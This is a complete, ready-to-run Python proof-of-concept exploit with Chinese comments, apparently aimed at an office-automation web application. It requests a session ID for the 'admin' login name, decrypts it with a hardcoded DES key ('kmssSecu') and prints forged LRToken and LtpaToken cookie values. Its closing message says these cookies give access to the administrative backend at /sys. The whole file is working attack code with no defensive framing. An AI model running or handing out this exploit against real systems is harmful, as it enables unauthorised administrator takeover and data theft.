# coding:u8
import base64
import sys
import requests
import urllib3
from Crypto.Cipher import DES
from Crypto.Util.Padding import unpad
import urllib.parse
from base64 import b64decode
from urllib.parse import parse_qs


def DesDecrypt(content, key):
    content = b64decode(content)

    cipher = DES.new(key, DES.MODE_ECB)

    # 解密密文并移除填充

    plaintext = unpad(cipher.decrypt(content), DES.block_size)

    return plaintext.decode('utf-8')


def poc_test(baseurl):
    url = urllib.parse.urljoin(baseurl, '/api/sys-authentication/loginService/getLoginSessionId.html')
    default_headers = {
        'User-Agent': 'Mozilla',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    data = 'loginName=admin'

    response = requests.post(url=url, data=data, headers=default_headers, verify=False)

    sessionId = response.json()['sessionId']

    encData = base64.b64decode(sessionId).decode()

    data = DesDecrypt(encData, b'kmssSecu')
    token = parse_qs(data)["id"][0]
    return token


if __name__ == "__main__":
    token = poc_test(sys.argv[1])
    print("在浏览器里面增加如下cookie，并且访问/sys路径即可进入后台")
    print("LRToken="+token)
    print("LtpaToken=" + token)